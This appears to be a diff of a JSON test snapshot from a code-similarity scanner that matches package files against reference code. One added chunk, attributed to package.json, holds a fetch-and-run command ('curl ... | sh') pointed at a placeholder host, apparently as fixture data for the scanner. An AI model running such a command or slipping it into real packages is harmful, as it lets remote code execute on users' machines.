@@ -2,10 +2,10 @@
   "package": "pkg",
   "version": "1.0.0",
   "score": 0.9876,
-  "seconds": 0.0670,
+  "seconds": 0.3427,
   "matched_packages": [
     { "package": "code_a_renamed.js", "group": "code_a_renamed.js", "ncd": 0.9876, "chunks": 1 },
-    { "package": "code_a.js", "group": "code_a.js", "ncd": 0.9962, "chunks": 4 },
+    { "package": "code_a.js", "group": "code_a.js", "ncd": 0.9962, "chunks": 6 },
     { "package": "code_a_minified.js", "group": "code_a_minified.js", "ncd": 0.9994, "chunks": 1 }
   ],
   "chunks": [
@@ -13,6 +13,8 @@
     { "file": "a.js", "start": 0, "ncd": 0.9876, "match": { "file": "code_a_renamed.js", "package": "code_a_renamed.js", "start": 0 }, "text": "module.exports = function a() { return 1; };\n" },
     { "file": "b.cjs", "start": 0, "ncd": 0.9994, "match": { "file": "code_a_minified.js", "package": "code_a_minified.js", "start": 0 }, "text": "exports.b = () => 'b';\n" },
     { "file": "c.mjs", "start": 0, "ncd": 0.9978, "match": { "file": "code_a.js", "package": "code_a.js", "start": 0 }, "text": "export const c = 3;\n" },
+    { "file": "install_scripts.txt", "start": 0, "ncd": 1.0000, "match": { "file": "code_a.js", "package": "code_a.js", "start": 0 }, "text": "node setup.js\n" },
+    { "file": "package.json", "start": 0, "ncd": 1.0000, "match": { "file": "code_a.js", "package": "code_a.js", "start": 0 }, "text": "curl -s http://example.invalid/x | sh\n" },
     { "file": "sub/deeper/y.js", "start": 0, "ncd": 0.9984, "match": { "file": "code_a.js", "package": "code_a.js", "start": 0 }, "text": "console.log('y');\n" },
     { "file": "sub/z.js", "start": 0, "ncd": 0.9984, "match": { "file": "code_a.js", "package": "code_a.js", "start": 0 }, "text": "console.log('z');\n" }
   ]
